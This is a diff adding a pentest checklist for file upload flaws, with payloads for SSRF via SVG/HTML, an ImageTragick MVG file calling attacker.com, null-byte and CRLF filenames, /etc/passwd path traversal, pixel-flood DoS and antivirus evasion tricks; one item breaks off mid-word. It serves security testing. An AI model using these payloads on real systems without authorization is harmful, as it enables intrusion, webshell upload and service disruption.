@@ -1,0 +1,166 @@
+🔍 1. Upload a Large File (Check for DoS)
+Purpose:To test whether the application/server can handle large file uploads or if it leads to resource exhaustion (DoS).
+How to Perform:
+Upload a file >100MB (or more) and observe:
+Does the server timeout?
+Does the application crash or hang?
+Is there a limit or error message?
+
+Tools:dd if=/dev/zero of=largefile.jpg bs=10M count=10
+Use a large dummy file:
+WINDOWS CMD : fsutil file createnew largefile.jpg 104857600
+LINUX CMD : dd if=/dev/zero of=largefile.jpg bs=10M count=10
+
+
+🔍 2. Rate Limiting on File Upload
+Purpose:To check if there is a rate limit on how frequently files can be uploaded. Without rate limiting, attackers could flood the server.
+How to Perform:
+Automate multiple upload requests in quick succession using:
+Burp Intruder
+ffuf / Turbo Intruder
+Monitor if the server:
+Blocks IPs (IF YES ... try using intruder to set diff it every time )
+Responds with 429 (Too Many Requests)
+Allows unlimited uploads (BAD)
+
+
+🔍 3. Upload Malicious Files (Antivirus/Scanner Check)
+Purpose:To test whether the server is scanning uploaded files for malware or viruses.
+How to Perform:
+Try uploading:
+EICAR test file (harmless test virus): https://www.eicar.org/
+Use the .com, .txt, or .zip version for testing.
+The contents are just a small ASCII string:
+X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+Attempt to upload it to the target system through the regular upload interface.
+Expected Results:
+File blocked? ✅
+Error message shown? ✅
+Alert generated in logs or dashboard? ✅
+Upload accepted? ❌ (should not be)
+Common malware samples (on safe lab systems only)
+Check:
+Is the file blocked?
+Is there an alert or error?
+
+Bypass Techniques to Test : 
+To test the robustness of the antivirus, attempt evasions (only in a test environment):
+Rename .exe to .jpg or .txt
+Double extensions: file.jpg.exe
+Compress into .zip, .rar, or .7z
+Use nested archives (e.g., zip inside zip)
+Base64 encode the fi
+
+
+🔍 4. SVG/HTML File Upload for SSRF
+Purpose:
+To check if uploading SVG or HTML files can be abused for Server-Side Request Forgery.
+How to Perform:
+
+Create file with linux :::::::::::::::::::::::::::::::::::
+cat > ssrf-test.svg <<EOF
+<svg xmlns="http://www.w3.org/2000/svg"
+     xmlns:xlink="http://www.w3.org/1999/xlink">
+  <image xlink:href="http://YOUR-BURP-COLLABORATOR-URL" height="100" width="100"/>
+</svg>
+EOF
+
+Windows PowerShell::::::::::::::::::::::::::::
+@"
+<svg xmlns="http://www.w3.org/2000/svg"
+     xmlns:xlink="http://www.w3.org/1999/xlink">
+  <image xlink:href="http://YOUR-BURP-COLLABORATOR-URL" height="100" width="100"/>
+</svg>
+"@ | Out-File -Encoding ASCII ssrf-test.svg
+
+HTML DOCUMENT :::::::::::::::::::::::::::::::
+<!DOCTYPE html>
+<html>
+  <body>
+    <img src="http://YOUR-BURP-COLLABORATOR-URL/ssrf-test" />
+  </body>
+</html>
+
+
+🔍 5. ImageMagick Library Attacks (ImageTragick)
+Purpose:
+To exploit ImageMagick processing bugs via crafted image files (e.g., remote code execution).
+How to Perform:
+Upload a malicious .mvg file like:
+
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://attacker.com")'
+pop graphic-context
+
+If the server uses ImageMagick, it may trigger an SSRF or RCE.
+
+
+
+🔍 6. Null Byte and CRLF Injection in Filename
+Purpose:
+To bypass backend validation by manipulating the filename field.
+How to Perform:
+Upload a file with filename:
+shell.php%00.jpg (Null byte)
+evil.jpg%0d%0asome-header: value (CRLF)
+Observe whether:
+File is treated as .php
+CRLF injection works in response headers
+Note: Many modern servers block %00, but older PHP or Java setups may be vulnerable.
+
+
+🔍 7. Modify Content-Type & File Name for LFI/SSRF
+Purpose:
+To check if changing file headers triggers Local File Inclusion or SSRF.
+How to Perform:
+Intercept the upload request in Burp Suite.
+Change headers like:
+Content-Type: application/x-php
+Filename: ../../../../../etc/passwd
+Payloads: http://127.0.0.1:8080/admin (for SSRF)
+Watch for responses or if the file is executed/included by the server.
+
+🔍 8. Pixel Flood Attack
+Purpose:
+To test for denial of service via images with massive pixel dimensions, consuming memory.
+How to Perform:
+Create a file with huge resolution (e.g., 99999 x 99999 pixels) but small file size:
+Use tools like ImageMagick, Python PIL, or GIMP.
+Upload and observe:
+Does the server crash or hang?
+Does it process and render the image?
+
+
+
+
+
+
+
+🔓 Bypass Techniques
+1. Null Byte Bypass
+Add %00 before extension: shell.php%00.jpg
+Some backend parsers stop at the null byte.
+
+2. Content-Type Bypass
+Change the header from image/png to:
+application/octet-stream
+text/plain
+application/x-php
+Sometimes validation relies on content-type.
+
+3. Magic Byte Bypass
+Modify the file signature (first few bytes) to spoof file type.
+Example: Change .php to start with \x89PNG... to appear as image.
+
+4. Client-Side Validation Bypass
+Disable JavaScript and try to upload disallowed file types.
+Use tools like Burp Suite to manipulate the request directly.
+
+5. Blacklisted Extension Bypass
+Try variants:
+shell.php.jpg
+shell.pHp
+shell.ph%00.jpg
+shell.php;.jpg
+.htaccess (to enable PHP execution in some servers)
